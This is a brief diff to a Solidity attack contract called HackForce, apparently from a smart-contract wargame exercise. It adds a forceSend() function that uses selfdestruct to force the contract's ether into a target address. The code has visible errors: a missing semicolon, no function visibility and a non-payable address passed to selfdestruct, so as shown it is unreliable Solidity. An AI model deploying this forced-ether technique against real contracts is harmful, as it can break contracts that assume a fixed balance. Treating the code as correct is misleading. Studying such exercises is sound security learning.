@@ -7,4 +7,8 @@ contract HackForce {
   constructor(address _forceAddress){
     forceAddress = _forceAddress
   }
+
+  function forceSend() {
+    selfdestruct(forceAddress);
+  }
 }
